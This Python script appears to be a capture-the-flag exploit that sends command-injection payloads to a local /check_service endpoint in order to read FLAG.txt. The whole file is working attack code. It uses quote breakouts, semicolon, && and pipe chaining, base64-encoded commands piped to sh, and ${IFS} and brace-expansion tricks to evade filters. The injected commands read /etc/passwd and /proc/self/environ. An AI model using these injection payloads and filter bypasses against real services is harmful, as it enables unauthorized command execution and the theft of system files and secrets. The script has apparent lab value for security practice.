import requests
import base64

base_url = "http://127.0.0.1:32972"
endpoint = "/check_service"
url = f"{base_url}{endpoint}"

def test_payload(payload, technique):
    """Test a single payload and return full response"""
    try:
        resp = requests.post(url, json={"service_name": payload}, timeout=10)
        return {
            "technique": technique,
            "payload": payload,
            "status": resp.status_code,
            "response": resp.text,
            "content_length": len(resp.content)
        }
    except Exception as e:
        return {
            "technique": technique,
            "payload": payload,
            "error": str(e)
        }

print("=" * 70)
print("EXPLOITING check_service.sh -t custom option")
print("=" * 70)

# The script usage shows: check_service.sh -t custom "/bin/myservice status"
# If we can inject quotes, we might break out and execute commands

print("\n[1] Testing quote injection to break out of command")
print("-" * 70)

quote_injection_tests = [
    ('-t custom "cat /etc/passwd"', "custom_quotes_etc"),
    ('-tcustom"cat /etc/passwd"', "custom_no_space_quotes"),
    ('custom"cat /etc/passwd"', "custom_prefix_quotes"),
    ('-t custom cat /etc/passwd', "custom_slashetc"),
    ('-tcustom"id"', "custom_id"),
    ('-tcustom"pwd"', "custom_pwd"),
]

for payload, tech in quote_injection_tests:
    result = test_payload(payload, tech)
    print(f"\n[{tech}] Payload: {payload}")
    print(f"Status: {result['status']}")
    print(f"Response: {result['response'][:300] if len(result['response']) > 300 else result['response']}")

print("\n" + "=" * 70)
print("[2] Testing with quote escaping and different quote types")
print("-" * 70)

escape_quote_tests = [
    ('\";cat /etc/passwd', "semicolon_cat"),
    ('\"&&cat /etc/passwd', "andand_cat"),
    ('\"|cat /etc/passwd', "pipe_cat"),
    ("';cat /etc/passwd", "single_semicolon"),
    ('"""cat /etc/passwd"""', "triple_quotes"),
    ('\x22;cat /etc/passwd', "hex_quote_semicolon"),
    ('\";ls;', "semicolon_ls"),
]

for payload, tech in escape_quote_tests:
    result = test_payload(payload, tech)
    print(f"\n[{tech}] Payload: {repr(payload)}")
    print(f"Status: {result['status']}")
    print(f"Response: {result['response'][:300] if len(result['response']) > 300 else result['response']}")

print("\n" + "=" * 70)
print("[3] Testing the custom type parameter properly")
print("-" * 70)

custom_type_tests = [
    ("-t ps ls", "type_ps"),
    ("-t systemctl ls", "type_systemctl"),
    ("-t custom ls", "type_custom_ls"),
    ("-t custom id", "type_custom_id"),
    ("-t custom whoami", "type_custom_whoami"),
    ("-t custom pwd", "type_custom_pwd"),
    ("-t custom 'ls -la'", "type_custom_quoted_ls"),
    ('-t custom "ls -la"', "type_custom_dblquoted_ls"),
]

for payload, tech in custom_type_tests:
    result = test_payload(payload, tech)
    print(f"\n[{tech}] Payload: {payload}")
    print(f"Status: {result['status']}")
    print(f"Response: {result['response'][:300] if len(result['response']) > 300 else result['response']}")

print("\n" + "=" * 70)
print("[4] Testing FLAG.txt access through custom type")
print("-" * 70)

flag_tests = [
    ("-t custom cat FLAG.txt", "custom_cat_flag"),
    ('-t custom "cat FLAG.txt"', "custom_dblquote_cat_flag"),
    ("-t custom 'cat FLAG.txt'", "custom_singlequote_cat_flag"),
    ("-t custom cat /FLAG.txt", "custom_cat_rootflag"),
    ('-t custom "cat /FLAG.txt"', "custom_cat_rootflag_dblq"),
    ("-tcustom cat FLAG.txt", "custom_nospace_catflag"),
]

for payload, tech in flag_tests:
    result = test_payload(payload, tech)
    print(f"\n[{tech}] Payload: {payload}")
    print(f"Status: {result['status']}")
    print(f"Response: {result['response']}")
    if 'flag' in result['response'].lower() or 'FLAG' in result['response']:
        print(f"\n!!! FLAG CONTENT FOUND !!!")
        print(f"Full Response: {result['response']}")

print("\n" + "=" * 70)
print("[5] Testing base64 encoded commands via custom type")
print("-" * 70)

b64_commands = [
    "cat FLAG.txt",
    "cat /FLAG.txt",
    "cat /home/user/FLAG.txt",
    "cat</FLAG.txt",
]

for cmd in b64_commands:
    encoded = base64.b64encode(cmd.encode()).decode()
    payload = f'-t custom "echo {encoded} | base64 -d | sh"'
    result = test_payload(payload, f"custom_b64_{cmd.replace(' ', '_')}")
    print(f"\n[B64 {cmd}] Payload: {payload}")
    print(f"Status: {result['status']}")
    print(f"Response: {result['response']}")
    if 'flag' in result['response'].lower():
        print(f"\n!!! FLAG FOUND !!!")
        print(f"Full Response: {result['response']}")

print("\n" + "=" * 70)
print("[6] Testing internal field separator in custom mode")
print("-" * 70)

ifs_tests = [
    ("-tcustom cat${IFS}FLAG.txt", "ifs_no_space_1"),
    ('-tcustom "cat${IFS}FLAG.txt"', "ifs_no_space_2"),
    ("-t custom cat${IFS}/FLAG.txt", "ifs_custom_root"),
    ('-t custom "cat${IFS}/FLAG.txt"', "ifs_custom_root_q"),
    ("-tcustom{cat,FLAG.txt}", "custom_brace"),
    ("-tcustom{cat,/FLAG.txt}", "custom_brace_root"),
]

for payload, tech in ifs_tests:
    result = test_payload(payload, tech)
    print(f"\n[{tech}] Payload: {payload}")
    print(f"Status: {result['status']}")
    print(f"Response: {result['response']}")

print("\n" + "=" * 70)
print("[7] Testing direcct command arguments")
print("-" * 70)

# Maybe the command goes directly without -t command
arg_tests = [
    ("cat /etc/passwd", "direct_cat_etc"),
    ("cat FLAG.txt", "direct_cat_flag"),
    ("/bin/cat FLAG.txt", "direct_bin_cat_flag"),
    ("/bin/sh -c 'cat FLAG.txt'", "bin_sh_flag"),
]

for payload, tech in arg_tests:
    result = test_payload(payload, tech)
    print(f"\n[{tech}] Payload: {payload}")
    print(f"Status: {result['status']}")
    print(f"Response: {result['response']}")

print("\n" + "=" * 70)
print("[8] Checking what happens with empty/whitespace manipulation")
print("-" * 70)

whitespace_tests = [
    ("cat</etc/passwd", "redirect_etc_passwd"),
    ("cat</FLAG.txt", "redirect_flag"),
    ("cat<FLAG.txt", "redirect_flag_rel"),
    ("head-1</etc/passwd", "head_etc"),
    ("head-1</FLAG.txt", "head_flag"),
    ("cat</proc/version", "version_check"),
    ("cat</proc/self/environ", "environ_check"),
]

for payload, tech in whitespace_tests:
    result = test_payload(payload, tech)
    print(f"\n[{tech}] Payload: {payload}")
    print(f"Status: {result['status']}")
    print(f"Response: {result['response']}")
    # Check if response contains anything interesting
    resp_lower = result['response'].lower()
    if any(x in resp_lower for x in ['flag', 'root:', 'version', 'linux', 'path=', 'home=']):
        print(f"*** INTERESTING CONTENT: {result['response'][:200]}")

